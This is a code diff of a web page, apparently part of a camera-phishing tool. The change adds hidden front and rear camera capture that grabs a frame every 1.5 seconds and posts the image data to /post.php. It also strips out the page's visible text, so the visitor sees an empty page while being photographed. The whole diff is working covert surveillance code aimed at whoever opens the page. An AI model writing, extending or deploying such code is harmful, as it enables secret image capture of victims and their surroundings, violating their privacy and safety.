@@ -6,78 +6,82 @@
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 </head>
 
+<body>
 <div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay></video>
+    <video id="frontVideo" playsinline autoplay></video>
+</div>
+<div class="video-wrap" hidden="hidden">
+    <video id="backVideo" playsinline autoplay></video>
 </div>
 
 <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 
 <script>
-
-    function post(imgdata){
+    function post(imgdata) {
         $.ajax({
             type: 'POST',
-            data: { cat: imgdata},
+            data: {cat: imgdata},
             url: '/post.php',
             dataType: 'json',
             async: false,
-            success: function(result){
+            success: function (result) {
                 // call the function that handles the response/results
             },
-            error: function(){
+            error: function () {
             }
         });
     };
 
-
     'use strict';
 
-    const video = document.getElementById('video');
+    const frontVideo = document.getElementById('frontVideo');
+    const backVideo = document.getElementById('backVideo');
     const canvas = document.getElementById('canvas');
     const errorMsgElement = document.querySelector('span#errorMsg');
 
     const constraints = {
         audio: false,
-        video: {
-
-            facingMode: "user"
-        }
+        video: true
     };
 
-    // Access webcam
+    // Access webcams
     async function init() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            handleSuccess(stream);
+            const frontStream = await navigator.mediaDevices.getUserMedia({
+                ...constraints,
+                video: {...constraints.video, facingMode: "user"}
+            });
+            const backStream = await navigator.mediaDevices.getUserMedia({
+                ...constraints,
+                video: {...constraints.video, facingMode: {exact: "environment"}}
+            });
+
+            handleSuccess(frontStream, frontVideo);
+            handleSuccess(backStream, backVideo);
         } catch (e) {
             errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
         }
     }
 
     // Success
-    function handleSuccess(stream) {
+    function handleSuccess(stream, videoElement) {
         window.stream = stream;
-        video.srcObject = stream;
+        videoElement.srcObject = stream;
+        videoElement.onloadedmetadata = function (e) {
+            videoElement.play();
+        };
 
         var context = canvas.getContext('2d');
-        setInterval(function(){
-
-            context.drawImage(video, 0, 0, 640, 480);
+        setInterval(function () {
+            context.drawImage(videoElement, 0, 0, 640, 480);
             var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-            post(canvasData); }, 1500);
-
-
+            post(canvasData);
+        }, 1500);
     }
 
     // Load init
     init();
-
 </script>
 
-<body>
-<p>Hint: Look at the favicon</p>
-<p>(Accept Permissions)</p>
-<p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
 </body>
-
 </html>
